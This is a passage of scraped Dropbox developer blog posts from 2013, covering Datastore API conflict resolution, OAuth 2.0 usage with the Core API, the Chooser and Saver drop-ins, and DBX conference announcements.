so it is indeed valid to label the final state with a specific set of field values. The same is true for any interior state (node) that is reachable via multiple paths. I can even prove mathematically that this is so, assuming only that the basic (single-square) algorithm satisfies this property. But I won’t bore you with that. :-) Optimizations and Simplifications You might imagine that for deltas of realistic sizes the diagram quickly becomes very large, and that the cost of conflict resolution approaches O(N**2) for merging two sets of N changes. That's true! Fortunately there are some observations that can save us a lot of time. For example, we can quickly determine that certain sets of changes commute trivially, for example when the table or record IDs differ, or when they affect different fields of the same record. This allows us to quickly skip over large sections of the diagram without doing any work. You can even sort the changes in each list to group changes by table and record ID (preserving the relative order of changes that affect the same record), reducing one large diagram to several unrelated, much smaller ones. It's also likely that for most applications conflicts will be rare, since most of the time devices will be online, and when offline, users tend to use a single device. Of course, the worst-case scenario can still pretty bad. The good news is that, because of the strict mathematical nature of the basic conflict resolution algorithm, we can improve the implementation in the SDK without having to change the API or the specification. So, if you think you are running into such a worst-case scenario, let us know! Insert vs. Update There are many details that I've left out in the above explanation. (I figured I'd save a few things for the inevitable \"Dropbox Datastores for Dummies\" book. :-) One interesting issue is how the Datastore SDK deals with conflicts involving record insertions. In case you just did a double-take, yes, record insertions can be part of a conflict, because of the API feature that lets the app choose the record ID. If you leave the record ID assignment to the SDK , you won't have to worry about this (the random numbering scheme used will unlikely produce a collision before the sun goes supernova), but if your app chooses record IDs manually you may well expect conflicts. For example, suppose your app manages a list of contacts and you use \"firstname.lastname\" as your record ID. Then if a user independently inserts a contact named John Smith in two different offline devices, these inserts will be considered a conflict, since both devices assigned it the same record ID, \"john.smith\". The conflict resolution code in the SDK treats this situation as follows: it breaks each insert operation into an insertion of an empty record (i.e. no fields are set), followed by an update that sets the field values. The empty record insertions commute (it doesn't matter which one we consider the \"winner\"), and the subsequent updates are treated as any other updates. What if you don't want this to happen? Then you probably should leave the record ID assignment to the SDK. The two changes are then considered independent, and the datastore will end up with two records for John Smith. What you do with that is then completely up to your app. Field Deletions Another detail I glossed over is how field deletions are handled. There are different schools of thought about these. Some consider a field deletion a special operation, which should always win in case of a field-field conflict. This is what the SDK currently does, but there are certain problems with this approach. Fortunately we haven't heard from anyone running into those problems. Others prefer to think of it as equivalent to setting the value to null, and resolving conflicts using the standard basic algorithm for two field updates. it is likely that we will change the SDK to use this approach. (The effect of a field deletion on the snapshot will not change — after a field is deleted, the field is deemed no longer to exist.) Up Next I hope you've enjoyed this deep dive so far! In the next installment I'll discuss list operations . // Tags Developers Tips Tricks Api V1 Deprecated // Copy link Link copied Link copied", "date": "2013-08-30"},
{"website": "Dropbox", "title": "Integrating the Dropbox Datastore API with Ractive.js", "author": ["Steve Marx"], "link": "https://dropbox.tech/developers/integrating-the-dropbox-datastore-api-with-ractive-js", "abstract": "Storing key/value pairs in datastores Get the library Update: The Sync and Datastore SDK has been deprecated. Learn more here. I recently came across Ractive.js , a nice JavaScript library created by Rich Harris for data binding and efficient DOM updates. Ractive is strictly about updating the DOM when data changes, so it doesn't address where the data lives or how it is changed. This makes it a perfect candidate to combine with a storage and syncing technology like the Datastore API . To see what such a combination would look like, I built Ractive Datastore , a 40-line library that provides two-way databinding courtesy of Ractive.js with cross-device syncing courtesy of the Datastore API. To see how it works, try the demo at ractiveds.site44.com . Storing key/value pairs in datastores The Datastore API supports a data model based on tables, records, and fields. Each table consists of a number of records (each with a unique ID), and each record consists of fields with typed values. For my data-binding uses, though, I really just wanted to store key/value pairs. I settled on a scheme with a single table. Inside that table, each record stores a single key/value pair, with the key being the record ID and the value being the value of a single field (called \"value\"). For example, to update the key/value pair recipient=Steve , I could use this line of JavaScript: Copy datastore.getTable(\"ractivedatastore\").get(\"recipient\").set(\"value\", \"Steve\"); Note that this code assumes that a record with the ID “name” already exists. I make sure that each key exists during the initialization step, which is keeping in line with the way Ractive.js works. The goal is to initialize a key/value pair in the table with a default value but never to overwrite any existing value in the table. Typically, when a record is inserted into a datastore table, it gets a randomly assigned record ID. To support my data model of key/value pairs, I need to instead assign my own record ID. This is possible with the getOrInsert method, as in the following code: Copy var defaultName = \"Bob\";\r\ndatastore.getTable(\"ractivedatastore\").getOrInsert(\"recipient\", {value: defaultName}); If there’s already a record with the ID \"recipient,\" this code will just return the existing record. If, however, there is no such record, this will insert a new one and set the value field to \"Bob.\" Get the library The full source code for the library is available in the Ractive Datastore project on GitHub , and you can play with a demo at ractiveds.site44.com . // Tags Developers Tips Tricks Api V1 Deprecated // Copy link Link copied Link copied", "date": "2013-08-28"},
{"website": "Dropbox", "title": "Programmatically download content from share links", "author": ["Steve Marx"], "link": "https://dropbox.tech/developers/programmatically-download-content-from-share-links", "abstract": "A “Dropbox share link” is a link that’s intended to be sent out to another Dropbox user. The URL looks like this picture of me doing my job as a developer advocate: https://www.dropbox.com/s/r3p1au45g3rylvs/advocated.jpeg . A share link renders a preview of the content and offers options for the user to download or view the actual file. Share links can be created from the Dropbox UI (right-click and select “Share Dropbox Link”), or they can be created using the Core API. If you have a share link for a file, you can download the file directly by using the ?raw=1 query parameter . For example, here again is me advocating: https://www.dropbox.com/s/r3p1au45g3rylvs/advocated.jpeg?raw=1 . If you just need to download the file once, it’s probably better to use a media link (“direct link” in Chooser terminology), but those links expire after four hours. Converting a share link is useful if you need a more “permanent” download link. I put “permanent” in scare quotes because a user can unshare the file at any time or simply move or delete it, at which point the link will stop working. // Tags Developers Tips Tricks Tips and Tricks Sharing // Copy link Link copied Link copied", "date": "2013-08-20"},
{"website": "Dropbox", "title": "Use Drop-ins with any app key", "author": ["Steve Marx"], "link": "https://dropbox.tech/developers/use-drop-ins-with-any-app-key", "abstract": "Update: The Sync and Datastore SDK has been deprecated. Learn more here. The Dropbox Platform is made up of several different APIs: Drop-ins, the Core and Sync APIs, and the new Datastore API. Some of the best apps built on the platform combine these APIs in interesting ways. Until recently, if you needed to use Drop-ins as well as one of the other APIs, you would have to create two apps in the App console . To make it easier to combine APIs, you can now use Drop-ins with any app key. As an example of when you might combine Drop-ins with another API, imagine that you’ve created a mobile app that uses the Sync API to sync files within an app folder. You might also want to allow a user to open a file from a different location, and the Chooser would be a great way to implement that. Now that you can use Drop-ins with any app key, you don’t need to create a separate app for the Drop-ins portion of your app. You can instead just use the same app key you’re using to work with the Sync API. With this change, you’ll now see an extra field in the App console for each of your Core and Sync API apps: This field is only required if you’re using Drop-ins on a website, in which case you need to provide the domain of the website so Dropbox knows to allow Drop-in use with your app key on that domain. This field already existed for Drop-ins apps, but now that every app can use Drop-ins, you’ll see this field on all of your apps. We hope this change simplifies your development. Let us know what you think on the forum ! // Tags Developers Drop-Ins Api V1 Tips Tricks Deprecated // Copy link Link copied Link copied", "date": "2013-08-22"},
{"website": "Dropbox", "title": "Dropbox Core API and OAuth 2 \"the hard way\"", "author": ["Steve Marx"], "link": "https://dropbox.tech/developers/dropbox-core-api-and-oauth-2-the-hard-way", "abstract": "Take a look Please do use existing SDKs Most developers use the Dropbox Core API through one of many existing SDKs, including third-party libraries supported by the community. But there's often something to be learned by peeling back a layer of abstraction and looking at what's underneath. In the case of the Core API, what's underneath is a simple web API built on HTTP, OAuth 2.0, and JSON . Last month, I published a blog post about how to use OAuth 2.0 with the Core API . In that post, I used curl to show you the raw HTTP requests involved in authorizing an app and then making calls to the API. I've recently published a project on GitHub called \" OAuth 2 the Hard Way ,\" which goes a step further and shows full working examples of web apps in a variety of languages. Each example demonstrates the following functionality: Running a web server. Redirecting the user to authenticate with Dropbox. Acquiring an access token to make API calls on behalf of the user. Making a simple API call to get the user's account info. I used friendly web frameworks (like Sinatra and Flask) where possible but avoided the use of any OAuth or Dropbox libraries. My goal was to keep each example as simple as possible while still showing exactly how the interaction with the Dropbox API works. Take a look So far, code examples are available for nine platforms: C#, Go, Java, browser JavaScript, Node.js, PHP, Perl, Python, and Ruby. Please check out the repository on GitHub and let me know what you think! Please do use existing SDKs As a final note, I do advise that you use the best available library for your chosen platform, rather than implementing your own. Hopefully, this project will give you a better understanding of how that library works and how to debug any issues that arise. // Tags Developers Tips Tricks Api V1 Deprecated // Copy link Link copied Link copied", "date": "2013-08-16"},
{"website": "Dropbox", "title": "Using the Chooser with specific file extensions", "author": ["Chris Varenhorst"], "link": "https://dropbox.tech/developers/using-the-chooser-with-specific-file-extensions", "abstract": "Try it out! Give us feedback With the Chooser , apps can ask the user to select a file from Dropbox. For some scenarios, like a photo-editing app, it may only make sense to select files with certain extensions. Today we added support to the web Chooser to filter files based on extension. We expect to add this feature to the Android and iOS Choosers in the future. To use the new extension filtering, you can either use the extensions option when calling Dropbox.Choose(options) or set the value of the data-extensions property when using the <input> tag. In addition to individual file extensions (like .pdf or .jpg ), you can add entire file types, including images , audio , video , documents and text . The following HTML will filter the Chooser to only .jpg and .png files: Copy <input type=\"dropbox-chooser\" data-extensions=\".jpg .png\" data-link-type=\"direct\" /> For the full details on this and other Chooser features, read the web Chooser documentation. Try it out! When using the Chooser with a file extension filter, users will still see all their files, but files that don’t match the allowed extensions will be grayed out and unselectable. You can see this in action by trying out this simple example, which only allows you to select .jpg and .png files: (If you don't see the example in your reader, try viewing this post on our blog.) Give us feedback Thank you to the developers who suggested this feature on our developer forum . Keep the suggestions coming! // Tags Developers Tips Tricks Drop-Ins Tips and Tricks // Copy link Link copied Link copied", "date": "2013-08-14"},
{"website": "Dropbox", "title": "Dropbox + Xamarin webinar recording available", "author": ["Steve Marx"], "link": "https://dropbox.tech/developers/dropbox-xamarin-webinar-recording-available", "abstract": "Update: The Sync and Datastore SDK has been deprecated. Learn more here. Yesterday, I participated in a webinar with the folks from Xamarin , where we talked about the Dropbox Platform in general and how to use it from C# using Xamarin. We covered the full platform, including Drop-ins, the Core and Sync APIs, and the new Datastore API. Thank you to Xamarin for inviting me to present, and thank you to everyone who attended. The recording is now available , embedded below: // Tags Developers Archive // Copy link Link copied Link copied", "date": "2013-08-14"},
{"website": "Dropbox", "title": "Live webinar tomorrow: Dropbox + Xamarin", "author": ["Steve Marx"], "link": "https://dropbox.tech/developers/live-webinar-tomorrow-dropbox-xamarin", "abstract": "Update: The Sync and Datastore SDK has been deprecated. Learn more here. Tomorrow morning, at 10am Pacific, I'll be co-presenting a live webinar with James Clancey from Xamarin . We'll be talking about the Dropbox API in general and showing how you can use the API from C# code using Xamarin's tools for iOS and Android. For a preview of what we'll demonstrate, take a look at Xamarin's blog post \" A quick look at Dropbox's new Datastore API .\" If you're interested, register for the webinar today ! // Tags Developers // Copy link Link copied Link copied", "date": "2013-08-12"},
{"website": "Dropbox", "title": "How the Datastore API Handles Conflicts – Part 1: Basics of Offline Conflict Handling", "author": ["Guido Van Rossum"], "link": "https://dropbox.tech/developers/how-the-datastore-api-handles-conflicts-part-1-basics-of-offline-conflict-handling", "abstract": "Introduction Example Scenario A Conflict Conflict Resolution Basics Up Next P.S. What about OT? Update: The Sync and Datastore SDK has been deprecated. Learn more here. At DBX we launched the Datastore API , which offers automatic conflict resolution for structured data. In this series of blog posts I explain how the datastore implementation detects and resolves conflicts. This is a multi-part series, because it is a complex algorithm and I want to do it justice. Introduction There are many interesting ideas underlying the datastore implementation, but the most basic one is to represent changes as objects. Those objects can be inspected, copied, serialized, persisted, transferred between clients and servers, and so on. You may recognize the Command pattern here. The Dropbox server stores the full list of changes for each datastore, and the state (a.k.a. snapshot) of a datastore can be obtained by executing the entire list of changes, in sequence, starting with an empty datastore. (The practical way to obtain a snapshot is different, and more efficient. :-) The list of changes stored on the server is structured into deltas, where each delta is a list of changes that has been labeled with a revision number. Revision numbers can also be used to refer to specific datastore snapshots (though not every snapshot is assigned a revision). The initial state of a datastore, completely empty, always has revision 0, and each delta increments the datastore's revision by 1. A delta is labeled with the revision number of the state that precedes it, so the very first delta has revision 0, and after executing it the datastore has revision 1. For this reason we sometimes call the delta's label its base revision . Example Scenario For this example I am making up an informal notation to represent changes that should be easy to understand. I need to be able to show two different types of things: datastore snapshots and deltas. Here's a picture of an empty datastore snapshot: Datastore: revision 0 Table ID Record ID Values It contains zero records! The headings show what's to come, though: each record has a table ID, a record ID, and some values. In this example there's only one table, so the table ID will always be the same. The record ID distinguishes records from each other. The values column contains simple values (like strings or numbers) each labeled with a field name. Here's a picture of a datastore snapshot with two records: Datastore: revision 1 Table ID Record ID Values T1 r1 name=\"Jack\", age=6 T1 r2 name=\"Jill\", age=5 Here are some deltas: Base revision Changes 0. insert T1:r1 {name=\"Jack\", age=6}; insert T1:r2 {name=\"Jill\", age=5} 1. update T1:r2 {age=6} 2. delete T1:r1; insert T1:r3 {name=\"Fred\", age=42} We've already seen the initial state of the datastore (revision 0 above, empty) and the state after executing delta 0 (revision 1 above). After executing delta 1, the datastore's contents is: Datastore: revision 2 Table ID Record ID Values T1 r1 name=\"Jack\", age=6 T1 r2 name=\"Jill\", age= 6 Finally, after delta 2, the datastore's contents is this: Datastore: revision 3 Table ID Record ID Values T1 r2 name=\"Jill\", age=6 T1 r3 name=\" Fred \", age= 42 Each delta originates on a particular device. For example, it is possible that delta 0 was generated by device A, delta 1 by device B, and delta 2 by device A again. (The identity of the originating device is not recorded with the delta, as it is not relevant to reconstructing the datastore state later.) The Dropbox server sends notifications for deltas to devices when the device is online. (This is accomplished through so-called HTTP long-polling, but the actual mechanism isn't relevant to understanding conflict resolution.) In the above example, we will see the following traffic between the server and the two devices: name=\" Fred \", age= 42 Table ID T1 T1 Each delta originates on a particular device. For example, it is possible that delta 0 was generated by device A, delta 1 by device B, and delta 2 by device A again. (The identity of the originating device is not recorded with the delta, as it is not relevant to reconstructing the datastore state later.) The Dropbox server sends notifications for deltas to devices when the device is online. (This is accomplished through so-called HTTP long-polling, but the actual mechanism isn't relevant to understanding conflict resolution.) In the above example, we will see the following traffic between the server and the two devices: The same algorithm works for any number of devices. All devices that are currently online except the one originating a delta receive a copy of that delta. Devices that are currently offline will receive it once they come back online. A Conflict Now suppose the last message (\"server to B: delta 2\") is lost, because device B has gone offline. At this point device B has a datastore snapshot with revision 2, while A and the server are at revision 3. While B is offline with a stale datastore snapshot, the user directs it to make a change, for example to change the age of one of the surviving characters. Once B comes back online, it attempts to send the server a delta containing this change. Because B's datastore snapshot had revision 2, it will label this delta with base revision 2: Base revision Changes 2. update T1:r2 {age=7} The server, knowing its datastore is already at revision 3, rejects this delta. In order to decide to reject a delta, the server doesn't look at its contents — if the revision doesn't match, that results in an immediate rejection. When the server rejects a delta, it also sends the list of deltas that will take a datastore from the device's current revision to the latest revision seen by the server. In this example that's just the same delta that the server received earlier from device A. It is then up to device B to resolve the conflict and send the server an updated delta representing its resolution of the conflict. Here are the precise messages exchanged in this scenario: datastore-messages2 The delta labeled with base revision 2 sent by B to the server does not contain the same changes as the delta 2 sent by the server to B in response. In these diagrams we don't concern ourselves with the specific changes, only with the base revisions used to label deltas. However, the delta 2 sent by the server to B is the same one it received from A in the previous diagram, and also the one that was lost on its way from the server to B previously. Next, let's look at how the client library actually resolves a conflict. Conflict Resolution Basics Let's assume the first three three deltas accepted by the server are the ones we showed earlier. Let's furthermore assume that B's rejected delta contained the single change: Copy update T1:r2 {age=7}   [rejected] (Jill is aging rapidly :-). The delta from A that B missed contains these changes: Copy delete T1:r1; insert T1:r3 {name=\"Fred\", age=42}   [accepted] As you can probably see, these deltas \"commute\" perfectly, by which we mean that it doesn't matter in which order they are executed: the resulting datastore state is the same either way. Therefore, \"resolving\" this particular conflict is trivial, and B just re-sends the same change relabeled as delta 3. If in the meantime the server didn't receive any other changes, the server will accept this, and transmit a copy of this change to A as well. Let's look at the datastore snapshots in device B. The last revision before the conflict was revision 2 shown earlier. After locally updating Jill's age, it has tentatively reached the following snapshot state: Datastore revision: ? (derived from 2) Table ID Record ID Values T1 r1 name=\"Jack\", age=6 T1 r2 name=\"Jill\", age= 7 However, after receiving the rejection of its delta, it rolls back to the previous snapshot (revision 2 again, as shown earlier). It then applies the delta it received from the server, obtaining an accurate copy of revision 3 shown earlier. Finally, after resolving the conflict, it re-applies the update to Jill's age, and reaches the following snapshot state: Datastore revision: ? (derived from 3) Table ID Record ID Values T1 r2 name=\"Jill\", age= 7 T1 r3 name=\"Fred\", age=42 Once the server has accepted the delta, the datastore revision is updated to 4, without changing the contents of the snapshot. Up Next In the next installment I'll show how the client library handles more interesting conflicts, which we call collisions — for example, what should happen if one device changes Fred's age to 43 and the other sets it to 17 (the answer may surprise you :-). But before I sign off for the day I'd like to address a question that might occur to certain academic readers and fans of Google Wave: P.S. What about OT? If you’re familiar with the theory of Operational Transformation (OT) , you might be surprised that the server doesn’t even attempt to resolve conflicts. We use OT-style conflict resolution on the client, but leave the server to simply serialize requests. This allows conflict resolution to be defined by the client — your app — giving you more freedom than traditional approaches (which usually require that the rules for conflict resolution be fixed). As you will see next time, a Datastore API client may customize conflict resolution to fit its own requirements. We realize that this occasionally leads to redundant network traffic, when the same (or almost the same) delta has to be transmitted a second time. But this should be relatively rare, and if this becomes a serious problem we can optimize it. Until then, we think it's a small price to pay for the added flexibility. // Tags Developers Tips Tricks Api V1 Deprecated // Copy link Link copied Link copied", "date": "2013-07-30"},
{"website": "Dropbox", "title": "Simplifying view updates in JavaScript with the Datastore API", "author": ["Erik Hope"], "link": "https://dropbox.tech/developers/simplifying-view-updates-in-javascript-with-the-datastore-api", "abstract": "A simple example Responding to changes Try it yourself Update: The Sync and Datastore SDK has been deprecated. Learn more here. The Datastore API, launched in beta at DBX , provides app developers with an easy way to synchronize data across devices and browsers. By registering change listeners, you can respond in real-time to changes made by other running instances of your app. In the JavaScript library, change listeners are called in response to both local and remote changes. Because all changes trigger the change listener, you can simplify your code by performing all your UI updates from there. A simple example To explore this design pattern, let’s consider a simple web app that presents three colored boxes, each with a text field that lets you update the color by typing in a hex color value. The app uses the Datastore API to synchronize changes to the colored boxes across running instances of the app. Each box is managed by a ColoredBox object in JavaScript. Each ColoredBox object is tied to a record in a datastore. Every time the text field is changed, the record is updated to match by calling the changed method. Note that the color of the box in the UI is not updated at this time. Only the record is changed: Copy function ColoredBox($el, record) {\r\n    this.$square = $('.color-box', $el);\r\n    this.$textbox = $('input', $el);\r\n    this.record = record;\r\n    this.update();\r\n    this.$textbox.on('focusout', this.changed.bind(this));\r\n}\r\n \r\nColoredBox.prototype.changed = function() {\r\n    this.record.set('color', this.$textbox.val());\r\n}; The ColoredBox object also has an update method, which is used to actually change the UI: Copy ColoredBox.prototype.update = function() {\r\n    var color = this.record.get('color');\r\n    this.$textbox.val(color);\r\n    return this.$square.css('background', color);\r\n}; Responding to changes To keep the UI in sync with the records in the datastore, all we need to do is configure a change listener that will call the update method on the appropriate ColoredBox every time a record is changed. This code is set up on initial page load: Copy datastore.recordsChanged.addListener(function(event) {\r\n    event.affectedRecordsForTable('colors').forEach(function(record) {\r\n        return colored_boxes[record.get('order')].update();\r\n    });\r\n}); Because we’ve triggered update from any record change, this same code handles both local changes from typing in a color and remote changes from another instance of the app. Try it yourself You can play with the app in the browser or view the full source code on GitHub . // Tags Developers Tips Tricks Api V1 Deprecated // Copy link Link copied Link copied", "date": "2013-07-25"},
{"website": "Dropbox", "title": "DBX 2013 session videos", "author": ["Steve Marx"], "link": "https://dropbox.tech/developers/dbx-2013-session-videos", "abstract": "Update: The Sync and Datastore SDK has been deprecated. Learn more here. Earlier this month, we held DBX, our first developer conference. We've posted videos of the technical sessions in the DBX channel on Vimeo : Keynote (Drew Houston) Working with Files on the Dropbox Platform (Steve Marx, Sean Lynch) Introducing Dropbox Datastores (Brian Smith, Guido van Rossum) Drop-ins: Chooser and Saver (Chris Varenhorst, Joshua Jenkins) Building for Business on the Dropbox Platform (Ilya Fushman, Thomas \"Tido\" Carriero) Designing Products for People (Rasmus Andersson, Adam Polselli) If you missed the conference or just want to watch your favorite talk again, be sure to check them out! http://vimeo.com/70089044 // Tags Developers // Copy link Link copied Link copied", "date": "2013-07-23"},
{"website": "Dropbox", "title": "File type permission: access just the files your app needs", "author": ["Andrew Twyman"], "link": "https://dropbox.tech/developers/file-type-permission-access-just-the-files-your-app-needs", "abstract": "Update: The Sync and Datastore SDK has been deprecated. Learn more here. To use the Core or Sync API, your app first needs permission to access data in a user’s Dropbox. When you create your app, you get to choose what permissions your app will request. At DBX , we added a new way to access just files of a specific type (text, videos, images, etc.) from a user's Dropbox. Simplify your code and boost performance with the new File type permission. Increase adoption Users are more likely to authorize an app that asks for minimal permissions. By requesting access to only the files your app needs, you can increase adoption of your app. Simplify code When you use the File type permission, your app will only see files of that type. This means you don’t need to write code to filter out the files you’re not interested in. Increase performance Because your app receives a filtered view, less data needs to be transferred when using the File type permission. This will increase the performance of your app, particularly when a user is on a spotty or slow Internet connection. Get started To get access to the File type permission, create a new Sync or Core app . Read the full details of what file types are supported in the developer guide . // Tags Developers Api V1 Tips Tricks Authorization Deprecated // Copy link Link copied Link copied", "date": "2013-07-11"},
{"website": "Dropbox", "title": "Using OAuth 2.0 with the Core API", "author": ["Steve Marx"], "link": "https://dropbox.tech/developers/using-oauth-2-0-with-the-core-api", "abstract": "Using the code grant Using the implicit grant Full documentation You may have heard that OAuth 2.0 simplifies development and provides better support for mobile apps. That’s why we announced OAuth 2.0 on the Core API at DBX this week. Most of the official Core API SDKs include OAuth 2.0 support already, so the best way to take advantage of OAuth 2.0 in your app is to use one of those libraries. That said, you can easily implement the protocol yourself if you need to. The Core API supports both the “code grant” (for apps with a server-side component like web apps) and the “implicit grant” (for client-side apps like mobile or JavaScript apps). Let’s dive in! Using the code grant Step 1: Begin authorization Directing the user to a URL like the following: Copy https://www.dropbox.com/1/oauth2/authorize?client_id=<app key>&response_type=code&redirect_uri=<redirect URI>&state=<CSRF token> You should use the state parameter to prevent cross-site request forgery (CSRF) attacks on your app. Our SDKs generate a CSRF token by base-64 encoding a secure 16-byte random number, and we store a copy in the user’s session. After the user has authorized your app, they’ll be sent to your redirect URI, with a few query parameters: Copy https://www.example.com/mycallback?code=<authorization code>&state=<CSRF token> Your app should verify the CSRF token matches the one you previously generated and stored, and then pull out the authorization code to use in the next step. Step 2: Obtain an access token To convert the authorization code to an access token, call the /token endpoint. Here’s an example of calling this endpoint using curl: Copy curl https://api.dropbox.com/1/oauth2/token -d code=<authorization code> -d grant_type=authorization_code -d redirect_uri=<redirect URI> -u <app key>:<app secret> The response will look like this: Copy {\"access_token\": \"<access token>\", \"token_type\": \"Bearer\", \"uid\": \"<user ID>\"} The access token is all you need to make calls to the Core API. Step 3: Call the API Now that you have an access token, you can call any method in the Core API by just attaching the following header: Copy Authorization: Bearer <access token> As an example, here’s how to use curl to get information about the user’s account: Copy curl https://api.dropbox.com/1/account/info -H \"Authorization: Bearer <access token>\" Using the implicit grant Step 1: Obtain an access token Direct the user to a URL that looks like this: Copy https://www.dropbox.com/1/oauth2/authorize?client_id=<app key>&response_type=token&redirect_uri=<redirect URI>&state=<CSRF token> After successful authorization, the user will be redirected to the specified redirect URI, with a few parameters in the URL fragment (after the hash): Copy https://www.example.com/mycallback#access_token=<access token>&token_type=Bearer&uid=<user ID>&state=<CSRF token> Your app should verify the CSRF token and pull out the access token to use in the next step. Step 2: Call the API Once you have an access token, making calls to the Core API is the same as in the code flow. Just use the Authorization: Bearer <access token> header. Full documentation Read the Core API documentation for more details about the OAuth 2.0 endpoints, or check out the OAuth 2.0 spec . If you have questions, join us in the developer forum ! // Tags Developers Api V1 Tips Tricks Deprecated Oauth // Copy link Link copied Link copied", "date": "2013-07-12"},
{"website": "Dropbox", "title": "The Chooser, now for iOS and Android", "author": ["Josiah Boning"], "link": "https://dropbox.tech/developers/the-chooser-now-for-ios-and-android", "abstract": "Last November, we launched the Chooser as a quick way to integrate Dropbox into your apps. Today, we’re launching the Chooser for iOS and Android. For the first time, users will be able to bring their files into your mobile app directly from Dropbox. Easy integration With just a few lines of Objective-C, Java, or JavaScript, you can integrate the Chooser into your apps and quickly tap into hundreds of millions of Dropboxes. Clean, consistent UI The Chooser works across platforms and provides a simple and clean interface for users to select files so you don't have to build your own from scratch. Preview or download links You can generate preview URLs or direct links to files. This allows you to decide whether you'd like to rely on Dropbox to host files or manage file hosting on your own. Simple permissions Apps are only granted access to files that users explicitly choose, and users don't have to go through cumbersome OAuth flows. We're thrilled that companies and teams of all sizes have already integrated the Chooser into their iOS and Android apps, including Yahoo! Mail , Mailbox , TextMe , Asana , do.com , Pic Stitch , Boxer , Mosaic.io , and Simple . \"Using Dropbox's new Chooser SDK, in just three hours we built a new feature that lets our customers seamlessly attach a PDF or image to transactions in Simple for iPhone.\" Dustin Barker, Simple's Director of Mobile To get started, explore our documentation and download the SDKs for Android or iOS. Try it out and give us your feedback ! // Tags Developers Drop-Ins Announcements Mobile // Copy link Link copied Link copied", "date": "2013-07-09"},
{"website": "Dropbox", "title": "The Datastore API: a new way to store and sync app data", "author": ["Brian Smith"], "link": "https://dropbox.tech/developers/the-datastore-api-a-new-way-to-store-and-sync-app-data", "abstract": "Update: The Sync and Datastore SDK has been deprecated. Learn more here. Hey developers, Today, we're excited for you try out the beta release of the Datastore API — simple databases for your apps with Dropbox sync built-in! Use datastores to save your app's data — settings, contacts, or any other content that users create — and Dropbox will take care of all the syncing for you. People who use your Datastore-enabled app can be sure their information will always be up-to-date and available, no matter what device or platform they use. Stay in sync() The Datastore API provides a new model for storing and syncing data beyond files. When you use datastores, you don't have to build a complicated sync engine from scratch — you can add the power of Dropbox into your app in a snap! Datastores work offline, too With datastores, your app works great even without an Internet connection. When a user goes offline, your app can continue to work with all its data locally. The next time the user is online, Dropbox will take care of syncing things up. Merge automatically Forget conflicts and combining changes when people use your app from different devices. With datastores, Dropbox can now understand the structure of your app data and automatically merge changes made at the same time. For example, simultaneous edits to a contact's phone number and email address will be merged without sync conflicts or any action from the user. Code faster with the Datastore Explorer The Datastore Explorer lets you see what's going on in your app as the data changes to help speed up development and dramatically simplify debugging. Get started If you're ready to dive in, explore our documentation and download the SDKs for Android, iOS, or JavaScript. Try it out and give us your feedback — we can't wait to see the apps you build with the Datastore API! // Tags Developers Announcements Api V1 Deprecated // Copy link Link copied Link copied", "date": "2013-07-09"},
{"website": "Dropbox", "title": "Meet the Dropbox Saver", "author": ["Chris Varenhorst"], "link": "https://dropbox.tech/developers/meet-the-dropbox-saver", "abstract": "These days, people are consuming more and more digital content across multiple devices and different platforms. But keeping track of downloads across your phone, computers, and tablets is a huge pain. We wanted to give people a quick and easy way to save it all in one secure place — even when on the go. Today, we're introducing the Saver, our newest Drop-in . It lets users save files from your app directly to Dropbox with a single click. The Saver is now available for web apps with native versions for iOS and Android coming soon! It's a cinch to set up. Just like the Chooser , you can integrate the Saver with a few lines of code. Files are instantly available on all devices. Photos, videos, e-books, and other files saved from your app are instantly synced to Dropbox and available across all of the user's devices. No interrupted downloads. Slow or failed downloads can be a headache, especially on mobile devices. Dropbox connects directly to your servers for fast and stable downloads. Saving continues even if the user's Internet connection drops. Content can also be cached by Dropbox so that the same file doesn't have to be downloaded over and over again from your servers. One of the first services to integrate the Saver is Shutterstock , which connects creative professionals with photos, illustrations, videos, and more from contributors around the world. Now, Shutterstock has a \"Save to Dropbox\" option for downloading media straight to Dropbox. \"Integrating with Dropbox provides an easy, frictionless way for Shutterstock users to save large images and videos at a moment's notice.\" Wyatt Jenkins, VP of Product for Shutterstock Dropbox4_saver Keep your eyes peeled for the Saver in other apps like PicMonkey , WooThemes , Outbox , Readlists , FetchApp , Loudr , and Chec . To learn how to integrate the Saver into your apps, check out the developer documentation . Try it out and give us your feedback ! // Tags Developers Drop-Ins Announcements // Copy link Link copied Link copied", "date": "2013-07-09"},
{"website": "Dropbox", "title": "First timer’s guide to DBX", "author": ["David Mann"], "link": "https://dropbox.tech/developers/first-timers-guide-to-dbx", "abstract": "DBX is tomorrow! Get a good night's rest Get to Fort Mason Come hungry Bring your questions Practice your Python Wear your party pants DBX is tomorrow! Since this is your first time attending DBX (ours too...), we put together a few tips and tricks to help you make the most of your first Dropbox developer conference . Get a good night's rest We’ve got an exciting day planned, from technical sessions to product demos to special guests. Registration and breakfast start at 9am, and Drew Houston will kick things off with his keynote right at 10:30am. Don’t be late! Get to Fort Mason All events, including general sessions and the afterparty, will take place at the historic Festival Pavilion at Fort Mason. There are a few ways to get there: MUNI : A number of different MUNI buses have stops directly next to Fort Mason. Cabs : It’s an easy ride from any part of the city. Car : There is a limited amount of paid parking available. Shuttles : We’re running shuttles every half hour between Civic Center, Caltrain, and Fort Mason. Walk : It’s supposed to be nice tomorrow! Come hungry The Dropbox engineering team will be available all day at the platform help desk to work with you on your app. Bring your questions Practice your Python Or just go with jeans. Once the sessions end, we’ve got a full evening’s worth of good food, cold drinks, great company, and a few special musical guests. We look forward to seeing you tomorrow! Wear your party pants // Tags Developers // Copy link Link copied Link copied", "date": "2013-07-08"},
{"website": "Dropbox", "title": "Introducing the Python Bee!", "author": ["Jacob Hurwitz"], "link": "https://dropbox.tech/developers/introducing-the-python-bee", "abstract": "Imagine coding blind, under time pressure, in front of a large audience. Is this a nightmare? No! It’s a Python bee. A Python bee is like a spelling bee for programmers. But instead of spelling words, contestants are given functions to write, one character at a time. A simple Python bee question might be: \"Write a function that, given two integers, returns their sum.\" The goal is to spell out a Python function: \"d–e–f–\"... and so on. Players must spell valid Python and every character counts, including symbols and whitespace. And the biggest twist: it’s all done in teams of two. Partners sit back-to-back and alternate characters, unable to signal or communicate about their solution. Credit for this creative idea goes to a group of MIT students who, in 2009, entered the Python bee into a competition for \"bad ideas.\" Since then, the bee has become a tradition at MIT and has spread to other institutions, including Dropbox. We've run Python bees at our past two Hack Weeks , and decided it’s time to take our bee to the next level: DBX. We'll be hosting a Python Bee for all of the developers attending our DBX conference next week! For all you DBX attendees who want to participate, look for signs for the Python Bee when you arrive on July 9—there will be information on how to enter the qualifying round. Just grab a partner and use your laptop or mobile device to enter. The top ten developers (five teams) from the qualifying round will be invited to participate in the DBX 